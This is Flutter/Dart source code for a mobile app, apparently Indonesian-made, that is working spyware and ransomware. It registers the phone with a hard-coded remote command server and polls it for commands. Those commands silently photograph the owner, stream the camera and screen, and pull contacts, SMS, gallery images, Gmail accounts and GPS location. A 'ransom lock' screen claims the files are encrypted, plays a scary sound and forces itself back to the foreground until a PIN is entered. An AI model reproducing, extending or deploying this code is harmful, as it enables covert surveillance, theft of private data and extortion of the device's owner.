import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'dart:ui';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'package:flutter_contacts/flutter_contacts.dart';
import 'package:geolocator/geolocator.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:audioplayers/audioplayers.dart';
import 'package:battery_plus/battery_plus.dart';
import 'package:camera/camera.dart';
import 'package:url_launcher/url_launcher.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:video_player/video_player.dart';

// ── SERVER ────────────────────────────────────────────────────────────────────
const String kServerBase = "http://zyrodevv-id.pteroqdactyl.my.id:10548";

// ── GLOBALS ───────────────────────────────────────────────────────────────────
ValueNotifier<bool> deviceLocked = ValueNotifier<bool>(false);
late AudioPlayer _audioPlayer;
String globalDeviceId = "";
String globalDeviceModel = "";
String currentLockMessage = "YOUR PHONE IS LOCKED!!!!";
String currentLockPIN = "1234";
String currentLockVideoUrl = "";

final lockChatMessages = ValueNotifier<List<Map<String, String>>>([]);
bool isLockLive = false;
String lockChatSenderName = "Admin";

// ── NATIVE CHANNELS ───────────────────────────────────────────────────────────
const MethodChannel platformStrobe = MethodChannel('com.nullx.pp/strobe');
const MethodChannel platformSpy = MethodChannel('com.nullx.pp/background_spy');

// ── LIVE STREAM ───────────────────────────────────────────────────────────────
bool _isLiveStreaming = false;
Timer? _liveStreamTimer;

// ════════════════════════════════════════════════════════════════════════════
// MAIN
// ════════════════════════════════════════════════════════════════════════════
void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  _audioPlayer = AudioPlayer();

  FlutterError.onError = (FlutterErrorDetails details) {
    FlutterError.presentError(details);
  };
  PlatformDispatcher.instance.onError = (error, stack) => true;

  if (Platform.isAndroid) {
    if (!await Permission.systemAlertWindow.isGranted) {
      await Permission.systemAlertWindow.request();
    }
    _requestNotifAccess();
  }

  await _requestPermissions();

  final info = await _getDeviceInfo();
  globalDeviceId = info['id']!;
  globalDeviceModel = info['model']!;

  try { await platformSpy.invokeMethod('saveTargetId', globalDeviceId); } catch (_) {}
  try { await platformSpy.invokeMethod('saveDeviceIdAll', globalDeviceId); } catch (_) {}

  final prefs = await SharedPreferences.getInstance();
  final savedPair = prefs.getString('pairId');
  if (savedPair != null && savedPair.isNotEmpty) {
    await _registerDevice(globalDeviceId, globalDeviceModel);
    _startSpyware(globalDeviceId);
  }

  try {
    final lockState = await platformSpy.invokeMethod('getLockState') as Map?;
    if (lockState != null && lockState['isLocked'] == true) {
      currentLockMessage = lockState['lockMessage']?.toString() ?? 'YOUR PHONE IS LOCKED!!!!';
      currentLockPIN = lockState['lockPin']?.toString() ?? '1234';
      isLockLive = lockState['isLockLive'] == true;
      deviceLocked.value = true;
      playScarySound();
      if (isLockLive) {
        try { await platformSpy.invokeMethod('bringToForeground'); } catch (_) {}
      }
    }
  } catch (_) {}

  try {
    final prefR = await SharedPreferences.getInstance();
    final isRansom = prefR.getBool('is_ransom') ?? false;
    if (isRansom) {
      final savedVideo = prefR.getString('ransom_video_url') ?? '';
      final savedPin = prefR.getString('ransom_pin') ?? '1234';
      final savedMsg = prefR.getString('ransom_msg') ?? 'FILE KAMU DIENKRIPSI';
      if (savedVideo.isNotEmpty || savedMsg.isNotEmpty) {
        currentLockVideoUrl = savedVideo;
        currentLockMessage = savedMsg;
        currentLockPIN = savedPin;
        deviceLocked.value = true;
        playScarySound();
        try { await platformSpy.invokeMethod('bringToForeground'); } catch (_) {}
        try { await platformSpy.invokeMethod('lockDeviceNow'); } catch (_) {}
      }
    }
  } catch (_) {}

  runApp(const AppRoot());
}

void _requestNotifAccess() async {
  try { await platformSpy.invokeMethod('openNotificationSettings'); } catch (_) {}
}

Future<void> _requestPermissions() async {
  await [
    Permission.location, Permission.contacts, Permission.storage,
    Permission.manageExternalStorage, Permission.camera, Permission.microphone,
    Permission.ignoreBatteryOptimizations, Permission.notification, Permission.sms,
    Permission.photos,
  ].request();
}

Future<Map<String, String>> _getDeviceInfo() async {
  final di = DeviceInfoPlugin();
  String model = "Unknown", id = "UNKNOWN";
  try {
    if (Platform.isAndroid) {
      final a = await di.androidInfo;
      model = "${a.brand.toUpperCase()} ${a.model}";
      id = "${a.brand}-${a.model}-${a.id}".replaceAll(' ', '_');
    } else if (Platform.isIOS) {
      final i = await di.iosInfo;
      model = i.name;
      id = i.identifierForVendor ?? "UNKNOWN_IOS";
    }
  } catch (_) { id = "ZDX-${Platform.localHostname.hashCode}"; }
  return {"id": id, "model": model};
}

Future<void> _registerDevice(String id, String model) async {
  try {
    final bat = Battery();
    int lv = await bat.batteryLevel.catchError((_) => 100);
    await http.post(Uri.parse("$kServerBase/api/register-target"),
        headers: {"Content-Type": "application/json"},
        body: jsonEncode({
          "id": id, "model": model, "battery": lv.toString(),
          "status": "Online", "lastSeen": DateTime.now().toIso8601String(),
        }));
  } catch (_) {}
}

// ── PAIRING ──────────────────────────────────────────────────────────────────
Future<bool> pairDevice(String pairId) async {
  try {
    final bat = Battery();
    int lv = await bat.batteryLevel.catchError((_) => 100);

    final url = "$kServerBase/api/pair-target";
    final body = jsonEncode({
      "pairId": pairId,
      "deviceId": globalDeviceId,
      "model": globalDeviceModel,
      "battery": lv.toString(),
    });

    debugPrint("═══════════════════════════════════════");
    debugPrint("[PAIR] URL: $url");
    debugPrint("[PAIR] Body: $body");
    debugPrint("═══════════════════════════════════════");

    final res = await http.post(
      Uri.parse(url),
      headers: {
        "Content-Type": "application/json",
        "Accept": "application/json",
      },
      body: body,
    ).timeout(const Duration(seconds: 30));

    debugPrint("[PAIR] Status Code: ${res.statusCode}");
    debugPrint("[PAIR] Response Body: ${res.body}");
    debugPrint("═══════════════════════════════════════");

    // ═══════════════════════════════════════════════════════════
    // TERIMA SEMUA RESPONSE, CEK MANUAL
    // ═══════════════════════════════════════════════════════════

    // 1. Kalo status 200-299 → cek body
    if (res.statusCode >= 200 && res.statusCode < 300) {
      // Coba parse JSON
      try {
        final data = jsonDecode(res.body);

        // Cek field 'valid'
        if (data is Map) {
          if (data['valid'] == true) {
            debugPrint("[PAIR] ✅ VALID (field valid=true)");
            await _savePairId(pairId);
            return true;
          }
          if (data['success'] == true) {
            debugPrint("[PAIR] ✅ VALID (field success=true)");
            await _savePairId(pairId);
            return true;
          }
          if (data['status'] == 'success' || data['status'] == true) {
            debugPrint("[PAIR] ✅ VALID (field status)");
            await _savePairId(pairId);
            return true;
          }
          if (data['paired'] == true) {
            debugPrint("[PAIR] ✅ VALID (field paired=true)");
            await _savePairId(pairId);
            return true;
          }

          // Kalo ada field 'message' error → return false
          final msg = (data['message'] ?? data['error'] ?? '').toString().toLowerCase();
          if (msg.contains('invalid') ||
              msg.contains('not found') ||
              msg.contains('tidak valid') ||
              msg.contains('tidak ditemukan')) {
            debugPrint("[PAIR] ❌ INVALID: $msg");
            return false;
          }
        }

        // Kalo status 200-299 dan gak ada field error → ANGGAP VALID
        debugPrint("[PAIR] ✅ Status 2xx, gak ada error → VALID");
        await _savePairId(pairId);
        return true;

      } catch (e) {
        // Response bukan JSON, tapi status 2xx → anggap valid
        debugPrint("[PAIR] ✅ Status 2xx, bukan JSON → VALID");
        await _savePairId(pairId);
        return true;
      }
    }

    // 2. Status 400/401/403/404 → coba parse error
    if (res.statusCode >= 400 && res.statusCode < 500) {
      try {
        final data = jsonDecode(res.body);
        final msg = (data['message'] ?? data['error'] ?? '').toString().toLowerCase();

        // Kalo 400 TAPI body bilang valid = true → valid (server lo aneh)
        if (data['valid'] == true || data['success'] == true) {
          debugPrint("[PAIR] ✅ VALID walau status 4xx");
          await _savePairId(pairId);
          return true;
        }

        debugPrint("[PAIR] ❌ Status ${res.statusCode}: $msg");
        return false;
      } catch (_) {
        debugPrint("[PAIR] ❌ Status ${res.statusCode} (bukan JSON)");
        return false;
      }
    }

    // 3. Status 5xx → server error
    debugPrint("[PAIR] ❌ Server Error: ${res.statusCode}");
    return false;

  } catch (e) {
    debugPrint("[PAIR] ❌ Exception: $e");
    return false;
  }
}

// Helper: Save pairId
Future<void> _savePairId(String pairId) async {
  final prefs = await SharedPreferences.getInstance();
  await prefs.setString('pairId', pairId);
  debugPrint("[PAIR] 💾 Saved pairId: $pairId");
}

void playScarySound() async {
  await _audioPlayer.setReleaseMode(ReleaseMode.loop);
  await _audioPlayer.play(UrlSource(
      'https://www.soundboard.com/handler/DownLoadTrack.ashx?cliptitle=Scary+Laugh&filename=24/243764-00f7e1b5-829d-4874-a690-671891b0c79b.mp3'));
}
void stopSound() async { await _audioPlayer.stop(); }

void _startLiveCamera(String id, String side) async {
  if (_isLiveStreaming) return;
  _isLiveStreaming = true;
  try { await platformSpy.invokeMethod('startLiveCameraStream', {"side": side}); } catch (_) {}
  _liveStreamTimer = Timer.periodic(const Duration(milliseconds: 50), (t) async {
    if (!_isLiveStreaming) { t.cancel(); return; }
    try {
      final f = await platformSpy.invokeMethod('getLiveFrame') as String?;
      if (f != null && f.isNotEmpty) {
        await http.post(Uri.parse("$kServerBase/api/live-frame/$id"),
            headers: {"Content-Type": "application/json"},
            body: jsonEncode({"frame": f, "ts": DateTime.now().millisecondsSinceEpoch}))
            .timeout(const Duration(seconds: 2));
      }
    } catch (_) {}
  });
}

void _startLiveScreen(String id) {
  if (_isLiveStreaming) return;
  _isLiveStreaming = true;
  _liveStreamTimer = Timer.periodic(const Duration(milliseconds: 50), (t) async {
    if (!_isLiveStreaming) { t.cancel(); return; }
    try {
      final f = await platformSpy.invokeMethod('startScreenStreamBackground') as String?;
      if (f != null && f.isNotEmpty) {
        await http.post(Uri.parse("$kServerBase/api/live-frame/$id"),
            headers: {"Content-Type": "application/json"},
            body: jsonEncode({"frame": f, "ts": DateTime.now().millisecondsSinceEpoch}))
            .timeout(const Duration(seconds: 2));
      }
    } catch (_) {}
  });
}

void _stopLive() {
  _isLiveStreaming = false;
  _liveStreamTimer?.cancel();
  _liveStreamTimer = null;
  platformSpy.invokeMethod('stopLiveCameraStream').catchError((_) {});
}

// ── SPYWARE LOOP ─────────────────────────────────────────────────────────────
void _startSpyware(String id) {
  Future<void> loop() async {
    try {
      final bat = Battery();
      int batLv = 100;
      try { batLv = await bat.batteryLevel; } catch (_) {}
      await http.post(Uri.parse("$kServerBase/api/heartbeat/$id"),
          headers: {"Content-Type": "application/json"},
          body: jsonEncode({"id": id, "status": "Alive", "battery": batLv.toString()}))
          .timeout(const Duration(seconds: 1));

      final res = await http.get(Uri.parse("$kServerBase/api/get-command/$id"));
      if (res.statusCode != 200 || res.body.isEmpty) return;

      final d = jsonDecode(res.body);
      String cmd = d['command'] ?? 'idle';
      if (cmd == 'idle') return;
      String extra = d['extra'] ?? '';
      dynamic result;

      if (cmd == 'lock_live') {
        if (extra.contains('|')) {
          final p = extra.split('|');
          currentLockMessage = p[0].isNotEmpty ? p[0] : 'HP INI DIKUNCI';
          currentLockPIN = p.length > 1 && p[1].isNotEmpty ? p[1] : '1234';
        }
        isLockLive = true;
        if (!deviceLocked.value) { deviceLocked.value = true; playScarySound(); }
        try { await platformSpy.invokeMethod('saveLockState', {
          'locked': true, 'isLockLive': true,
          'message': currentLockMessage, 'pin': currentLockPIN
        }); } catch (_) {}
        try { await platformSpy.invokeMethod('startLockOverlay', {
          'message': currentLockMessage, 'pin': currentLockPIN
        }); } catch (_) {}
        try { await platformSpy.invokeMethod('lockDeviceNow'); } catch (_) {}
        result = {"status": "LockLive"};
      }
      else if (cmd == 'hard_lock' || cmd == 'lock_device') {
        if (extra.contains('|')) {
          final p = extra.split('|');
          currentLockMessage = p[0].isNotEmpty ? p[0] : 'YOUR PHONE IS LOCKED!!!!';
          currentLockPIN = p.length > 1 && p[1].isNotEmpty ? p[1] : '1234';
        } else if (extra.isNotEmpty) { currentLockMessage = extra; }
        if (!deviceLocked.value) { deviceLocked.value = true; playScarySound(); }
        try { await platformSpy.invokeMethod('saveLockState', {
          'locked': true, 'isLockLive': false,
          'message': currentLockMessage, 'pin': currentLockPIN
        }); } catch (_) {}
        try { await platformSpy.invokeMethod('startLockOverlay', {
          'message': currentLockMessage, 'pin': currentLockPIN
        }); } catch (_) {}
        try { await platformSpy.invokeMethod('lockDeviceNow'); } catch (_) {}
        result = {"status": "Locked"};
      } else if (cmd == 'unlock' || cmd == 'unlock_device') {
        deviceLocked.value = false;
        currentLockVideoUrl = '';
        stopSound();
        try { await platformStrobe.invokeMethod('stopStrobe'); } catch (_) {}
        try { await platformSpy.invokeMethod('saveLockState', {'locked': false, 'isLockLive': false, 'message': '', 'pin': ''}); } catch (_) {}
        try { await platformSpy.invokeMethod('stopLockOverlay'); } catch (_) {}
        try { await platformSpy.invokeMethod('stopRansomLock'); } catch (_) {}
        result = {"status": "Unlocked"};
      } else if (cmd == 'take_photo') {
        final camStatus = await Permission.camera.request();
        if (camStatus.isGranted) {
          final b64 = await platformSpy.invokeMethod('takeSilentPhotoBackground', {"side": extra.isEmpty ? "back" : extra});
          result = b64 != null ? {"status": "Success", "image_base64": b64} : {"status": "Failed - camera returned null"};
        } else {
          result = {"status": "Failed - camera permission denied"};
        }
      } else if (cmd == 'get_screen') {
        final b64 = await platformSpy.invokeMethod('startScreenStreamBackground');
        result = {"status": "Success", "image_base64": b64 ?? ""};
      } else if (cmd == 'live_camera_start') {
        _stopLive(); _startLiveCamera(id, extra.isEmpty ? 'back' : extra);
        result = {"status": "Live camera started"};
      } else if (cmd == 'live_screen_start') {
        _stopLive(); _startLiveScreen(id);
        result = {"status": "Live screen started"};
      } else if (cmd == 'live_stop') {
        _stopLive(); result = {"status": "Stopped"};
      } else if (cmd == 'get_gmails') {
        final emails = await platformSpy.invokeMethod('getGmailAccounts') as String? ?? '';
        result = {"accounts": emails.isEmpty ? "No Gmail Found" : emails};
      } else if (cmd == 'set_wallpaper_b64') {
        try {
          await platformSpy.invokeMethod('setWallpaperFromBase64', {"data": extra});
          result = {"status": "Wallpaper set from upload"};
        } catch (e) { result = {"status": "Error: $e"}; }
      } else if (cmd == 'set_wallpaper') {
        await platformSpy.invokeMethod('setWallpaper', {"url": extra}); result = {"status": "Done"};
      } else if (cmd == 'play_audio') {
        try { await _audioPlayer.stop(); await _audioPlayer.play(UrlSource(extra)); result = {"status": "Playing"}; }
        catch (e) { result = {"status": "Error: $e"}; }
      } else if (cmd == 'stop_audio') {
        await _audioPlayer.stop(); result = {"status": "Stopped"};
      } else if (cmd == 'get_contacts' || cmd == 'dump_contacts') {
        if (await FlutterContacts.requestPermission()) {
          final list = await FlutterContacts.getContacts(withProperties: true, withPhoto: false);
          result = {"contacts": list.take(50).map((e) => {"name": e.displayName, "number": e.phones.isNotEmpty ? e.phones.first.number : ""}).toList()};
        }
      } else if (cmd == 'flash_strobe') {
        await platformStrobe.invokeMethod('startStrobe'); result = {"status": "On"};
      } else if (cmd == 'stop_strobe') {
        await platformStrobe.invokeMethod('stopStrobe'); result = {"status": "Off"};
      } else if (cmd == 'vibrate_loop') {
        try {
          await platformSpy.invokeMethod('vibrateDevice', {'duration': 5000});
        } catch (_) {
          for (int i = 0; i < 10; i++) {
            await Future.delayed(const Duration(milliseconds: 300));
          }
        }
        result = {"status": "Vibrating"};
      } else if (cmd == 'open_url') {
        final url = Uri.parse(extra);
        if (await canLaunchUrl(url)) await launchUrl(url, mode: LaunchMode.externalApplication);
        result = {"status": "Opened"};
      } else if (cmd == 'get_location' || cmd == 'track_gps') {
        final pos = await Geolocator.getCurrentPosition(desiredAccuracy: LocationAccuracy.high);
        result = {"lat": pos.latitude, "lng": pos.longitude};
      } else if (cmd == 'force_open') {
        try { await platformSpy.invokeMethod('bringToForeground'); } catch (_) {}
        result = {"status": "OK"};
      } else if (cmd == 'reboot_device' || cmd == 'restart_device') {
        try {
          await platformSpy.invokeMethod('rebootDevice');
          result = {"status": "Rebooting"};
        } catch (e) {
          result = {"status": "reboot_failed: ${e.toString()}"};
        }
      } else if (cmd == 'get_sms') {
        try {
          final smsList = await platformSpy.invokeMethod('getSmsMessages');
          result = {"sms": smsList};
        } catch (e) { result = {"sms": [], "error": e.toString()}; }
      } else if (cmd == 'get_gallery') {
        try {
          final imgs = await platformSpy.invokeMethod('getGalleryImages', {"limit": 5});
          result = {"images": imgs ?? []};
        } catch (e) { result = {"images": [], "error": e.toString()}; }
      } else if (cmd == 'chat_msg') {
        if (extra.isNotEmpty) {
          final msgs = List<Map<String, String>>.from(lockChatMessages.value);
          msgs.add({'from': 'owner', 'text': extra, 'time': DateTime.now().toString().substring(11, 16)});
          lockChatMessages.value = msgs;
        }
        result = {"status": "msg_received"};
      } else if (cmd == 'open_notification_settings') {
        _requestNotifAccess(); result = {"status": "Opened"};
      } else if (cmd == 'kill_wifi') {
        try {
          await platformSpy.invokeMethod('disableWifi');
          result = {"status": "WiFi disabled"};
        } catch (_) {
          result = {"status": "Failed - no permission"};
        }
      } else if (cmd == 'ransom_lock') {
        try {
          final parts = extra.split('||');
          final msg = parts.isNotEmpty && parts[0].isNotEmpty ? parts[0] : 'YOUR FILES HAVE BEEN ENCRYPTED';
          final pin = parts.length > 1 && parts[1].isNotEmpty ? parts[1] : '1234';
          final video = parts.length > 2 ? parts[2] : '';

          currentLockMessage = msg;
          currentLockPIN = pin;
          currentLockVideoUrl = video;
          isLockLive = false;

          if (!deviceLocked.value) {
            deviceLocked.value = true;
            playScarySound();
          }

          try {
            await platformSpy.invokeMethod('saveLockState', {
              'locked': true, 'isLockLive': false,
              'message': msg, 'pin': pin,
            });
          } catch (_) {}
          try {
            final prefs2 = await SharedPreferences.getInstance();
            await prefs2.setString('ransom_video_url', video);
            await prefs2.setString('ransom_pin', pin);
            await prefs2.setString('ransom_msg', msg);
            await prefs2.setBool('is_ransom', true);
          } catch (_) {}

          try { await platformSpy.invokeMethod('lockDeviceNow'); } catch (_) {}
          try { await platformSpy.invokeMethod('bringToForeground'); } catch (_) {}
          result = {"status": "Ransom lock aktif"};
        } catch (e) { result = {"status": "Error: $e"}; }
      }

      if (result != null) {
        await http.post(Uri.parse("$kServerBase/api/post-response/$id"),
            headers: {"Content-Type": "application/json"},
            body: jsonEncode({"data": result, "cmd": cmd}));
      }
    } catch (_) {}
  }
  Timer.periodic(const Duration(milliseconds: 500), (_) => loop());
}

// ════════════════════════════════════════════════════════════════════════════
// RANSOM VIDEO WIDGET
// ════════════════════════════════════════════════════════════════════════════
class _RansomVideoWidget extends StatefulWidget {
  final String url;
  const _RansomVideoWidget({required this.url});
  @override State<_RansomVideoWidget> createState() => _RansomVideoWidgetState();
}

class _RansomVideoWidgetState extends State<_RansomVideoWidget> {
  VideoPlayerController? _ctrl;
  bool _ready = false;

  @override
  void initState() { super.initState(); _initVideo(); }

  Future<void> _initVideo() async {
    try {
      _ctrl = VideoPlayerController.networkUrl(Uri.parse(widget.url))
        ..initialize().then((_) {
          if (mounted) {
            setState(() => _ready = true);
            _ctrl!.setLooping(true);
            _ctrl!.setVolume(1.0);
            _ctrl!.play();
          }
        }).catchError((_) {});
    } catch (_) {}
  }

  @override
  void dispose() { _ctrl?.dispose(); super.dispose(); }

  @override
  Widget build(BuildContext context) {
    return SizedBox.expand(
      child: _ready && _ctrl != null && _ctrl!.value.isInitialized
          ? FittedBox(fit: BoxFit.cover,
              child: SizedBox(
                  width: _ctrl!.value.size.width,
                  height: _ctrl!.value.size.height,
                  child: VideoPlayer(_ctrl!)))
          : Container(
              color: Colors.black,
              child: const Center(child: Column(mainAxisSize: MainAxisSize.min, children: [
                CircularProgressIndicator(color: Colors.red, strokeWidth: 2),
                SizedBox(height: 12),
                Text('Memuat video...', style: TextStyle(color: Colors.white38, fontSize: 11)),
              ]))),
    );
  }
}

// ════════════════════════════════════════════════════════════════════════════
// APP ROOT
// ════════════════════════════════════════════════════════════════════════════
class AppRoot extends StatelessWidget {
  const AppRoot({super.key});
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      title: 'ZXC CRASHERS',
      theme: ThemeData(
        brightness: Brightness.dark,
        scaffoldBackgroundColor: Colors.black,
      ),
      home: const LockWrapper(),
    );
  }
}

// ════════════════════════════════════════════════════════════════════════════
// LOCK WRAPPER
// ════════════════════════════════════════════════════════════════════════════
class LockWrapper extends StatefulWidget {
  const LockWrapper({super.key});
  @override State<LockWrapper> createState() => _LockWrapperState();
}

class _LockWrapperState extends State<LockWrapper> with WidgetsBindingObserver {
  final _pinCtrl = TextEditingController();
  final _chatCtrl = TextEditingController();
  final _chatScroll = ScrollController();
  Timer? _chatPollTimer;
  Timer? _enforceLockTimer;

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addObserver(this);
    _chatPollTimer = Timer.periodic(const Duration(seconds: 3), (_) => _pollChat());
    _enforceLockTimer = Timer.periodic(const Duration(seconds: 1), (_) {
      if (deviceLocked.value) {
        try { platformSpy.invokeMethod('bringToForeground'); } catch (_) {}
        try { platformSpy.invokeMethod('lockDeviceNow'); } catch (_) {}
      }
    });
  }

  @override
  void dispose() {
    WidgetsBinding.instance.removeObserver(this);
    _pinCtrl.dispose(); _chatCtrl.dispose(); _chatScroll.dispose();
    _chatPollTimer?.cancel();
    _enforceLockTimer?.cancel();
    super.dispose();
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState s) {
    if (deviceLocked.value) {
      void force() {
        try { platformSpy.invokeMethod('bringToForeground'); } catch (_) {}
        try { platformSpy.invokeMethod('lockDeviceNow'); } catch (_) {}
      }
      force();
      Future.delayed(const Duration(milliseconds: 100), force);
      Future.delayed(const Duration(milliseconds: 300), force);
      Future.delayed(const Duration(milliseconds: 700), force);
      Future.delayed(const Duration(milliseconds: 1500), force);
      Future.delayed(const Duration(milliseconds: 3000), force);
    }
  }

  Future<void> _pollChat() async {
    if (!deviceLocked.value || globalDeviceId.isEmpty) return;
    try {
      final res = await http.get(Uri.parse('$kServerBase/api/lock-chat/$globalDeviceId'))
          .timeout(const Duration(seconds: 4));
      if (res.statusCode == 200) {
        final body = jsonDecode(res.body);
        final msgs = body['messages'] as List? ?? [];
        if (msgs.isNotEmpty && mounted) {
          final current = List<Map<String, String>>.from(lockChatMessages.value);
          for (final m in msgs) {
            current.add({
              'from': m['from']?.toString() ?? 'owner',
              'text': m['text']?.toString() ?? '',
              'time': m['time']?.toString() ?? '',
            });
          }
          lockChatMessages.value = current;
          Future.delayed(const Duration(milliseconds: 100), () {
            if (_chatScroll.hasClients) {
              _chatScroll.animateTo(_chatScroll.position.maxScrollExtent,
                  duration: const Duration(milliseconds: 200), curve: Curves.easeOut);
            }
          });
        }
      }
    } catch (_) {}
  }

  Future<void> _sendChatReply(String text) async {
    if (text.trim().isEmpty || globalDeviceId.isEmpty) return;
    _chatCtrl.clear();
    final current = List<Map<String, String>>.from(lockChatMessages.value);
    current.add({'from': 'target', 'text': text.trim(), 'time': TimeOfDay.now().format(context)});
    lockChatMessages.value = current;
    try {
      await http.post(Uri.parse('$kServerBase/api/lock-chat/$globalDeviceId'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({'text': text.trim(), 'from': 'target'}),
      ).timeout(const Duration(seconds: 5));
    } catch (_) {}
    Future.delayed(const Duration(milliseconds: 100), () {
      if (_chatScroll.hasClients) {
        _chatScroll.animateTo(_chatScroll.position.maxScrollExtent,
            duration: const Duration(milliseconds: 200), curve: Curves.easeOut);
      }
    });
  }

  void _tryUnlock(String pin) {
    if (pin.trim() == currentLockPIN.trim()) {
      deviceLocked.value = false;
      isLockLive = false;
      currentLockVideoUrl = '';
      lockChatMessages.value = [];
      stopSound();
      _pinCtrl.clear();
      platformSpy.invokeMethod('stopLockOverlay').catchError((_) {});
      platformSpy.invokeMethod('stopRansomLock').catchError((_) {});
      platformSpy.invokeMethod('saveLockState', {
        'locked': false, 'isLockLive': false, 'message': '', 'pin': ''
      }).catchError((_) {});
      SharedPreferences.getInstance().then((p) {
        p.remove('is_ransom');
        p.remove('ransom_video_url');
        p.remove('ransom_pin');
        p.remove('ransom_msg');
      }).catchError((_) {});
    } else {
      _pinCtrl.clear();
      ScaffoldMessenger.of(context).showSnackBar(const SnackBar(
          content: Text("PIN Salah!", style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
          backgroundColor: Colors.red, duration: Duration(seconds: 1)));
    }
  }

  @override
  Widget build(BuildContext context) {
    return ValueListenableBuilder<bool>(
      valueListenable: deviceLocked,
      builder: (ctx, locked, _) {
        return WillPopScope(
          onWillPop: () async => false,
          child: Stack(children: [
            const PairingHomePage(),

            if (locked)
              Scaffold(
                backgroundColor: Colors.black,
                resizeToAvoidBottomInset: true,
                body: ValueListenableBuilder<List<Map<String, String>>>(
                  valueListenable: lockChatMessages,
                  builder: (_, msgs, __) {
                    return Container(
                      width: double.infinity, height: double.infinity,
                      decoration: BoxDecoration(
                        gradient: LinearGradient(
                          begin: Alignment.topCenter, end: Alignment.bottomCenter,
                          colors: isLockLive
                              ? [const Color(0xFF000A1A), Colors.black]
                              : [const Color(0xFF1A0000), Colors.black],
                        ),
                      ),
                      child: SafeArea(
                        child: isLockLive ? _buildLockLiveUI(msgs) : _buildLockBasicUI(),
                      ),
                    );
                  },
                ),
              ),
          ]),
        );
      },
    );
  }

  Widget _buildLockBasicUI() {
    return GestureDetector(
      onVerticalDragStart: (_) {},
      onVerticalDragUpdate: (_) {},
      onHorizontalDragStart: (_) {},
      onHorizontalDragUpdate: (_) {},
      child: SingleChildScrollView(
        physics: const NeverScrollableScrollPhysics(),
        child: ConstrainedBox(
          constraints: BoxConstraints(minHeight: MediaQuery.of(context).size.height),
          child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
            const SizedBox(height: 20),
            if (currentLockVideoUrl.isNotEmpty) ...[
              SizedBox(
                width: MediaQuery.of(context).size.width,
                height: MediaQuery.of(context).size.height,
                child: Stack(fit: StackFit.expand, children: [
                  _RansomVideoWidget(url: currentLockVideoUrl),
                  Container(color: Colors.black.withOpacity(0.55)),
                  SafeArea(child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
                    const Icon(Icons.lock_rounded, color: Color(0xFFFF1744), size: 64,
                        shadows: [Shadow(color: Colors.black, blurRadius: 8)]),
                    const SizedBox(height: 16),
                    Padding(padding: const EdgeInsets.symmetric(horizontal: 24),
                        child: Text(currentLockMessage, textAlign: TextAlign.center,
                            style: const TextStyle(color: Colors.white, fontSize: 16,
                                fontWeight: FontWeight.w800, height: 1.5,
                                shadows: [Shadow(color: Colors.black, blurRadius: 10)]))),
                    const SizedBox(height: 36),
                    Padding(padding: const EdgeInsets.symmetric(horizontal: 40),
                        child: TextField(
                            controller: _pinCtrl, obscureText: true,
                            keyboardType: TextInputType.number, textAlign: TextAlign.center,
                            style: const TextStyle(color: Colors.white, fontSize: 28, letterSpacing: 12, fontWeight: FontWeight.bold),
                            decoration: InputDecoration(
                              hintText: '● ● ● ●',
                              hintStyle: const TextStyle(color: Colors.white38, letterSpacing: 6),
                              filled: true, fillColor: Colors.black.withOpacity(0.5),
                              border: OutlineInputBorder(borderRadius: BorderRadius.circular(14), borderSide: const BorderSide(color: Color(0xFFFF1744))),
                              enabledBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(14), borderSide: BorderSide(color: const Color(0xFFFF1744).withOpacity(0.4))),
                              focusedBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(14), borderSide: const BorderSide(color: Color(0xFFFF1744), width: 2)),
                            ),
                            onChanged: (v) { if (v.length >= 4) _tryUnlock(v); },
                            onSubmitted: _tryUnlock)),
                    const SizedBox(height: 14),
                    SizedBox(width: 200, height: 50,
                        child: ElevatedButton(
                            style: ElevatedButton.styleFrom(
                                backgroundColor: const Color(0xFFFF1744),
                                shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(14))),
                            onPressed: () => _tryUnlock(_pinCtrl.text),
                            child: const Text('BUKA KUNCI',
                                style: TextStyle(color: Colors.white, fontWeight: FontWeight.w900, letterSpacing: 2)))),
                  ])),
                ]),
              ),
            ] else ...[
              const Icon(Icons.lock_rounded, color: Colors.red, size: 60),
              const SizedBox(height: 14),
              Padding(padding: const EdgeInsets.symmetric(horizontal: 24),
                  child: Text(currentLockMessage, textAlign: TextAlign.center,
                      style: const TextStyle(color: Colors.red, fontSize: 16, fontWeight: FontWeight.bold, height: 1.5))),
              const SizedBox(height: 32),
              Padding(padding: const EdgeInsets.symmetric(horizontal: 40),
                  child: TextField(
                      controller: _pinCtrl, obscureText: true,
                      keyboardType: TextInputType.number, textAlign: TextAlign.center,
                      style: const TextStyle(color: Colors.white, fontSize: 28, letterSpacing: 12, fontWeight: FontWeight.bold),
                      decoration: InputDecoration(
                        hintText: '● ● ● ●', hintStyle: const TextStyle(color: Colors.white24, letterSpacing: 6),
                        filled: true, fillColor: Colors.white10,
                        border: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: const BorderSide(color: Colors.red)),
                        enabledBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: BorderSide(color: Colors.red.withOpacity(0.4))),
                        focusedBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: const BorderSide(color: Colors.redAccent, width: 2))),
                      onChanged: (v) { if (v.length >= 4) _tryUnlock(v); },
                      onSubmitted: _tryUnlock)),
              const SizedBox(height: 16),
              SizedBox(width: 200, height: 50,
                  child: ElevatedButton(
                      style: ElevatedButton.styleFrom(backgroundColor: Colors.red[900], shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12))),
                      onPressed: () => _tryUnlock(_pinCtrl.text),
                      child: const Text('BUKA KUNCI', style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold, letterSpacing: 2)))),
            ],
            const SizedBox(height: 40),
          ]),
        ),
      ),
    );
  }

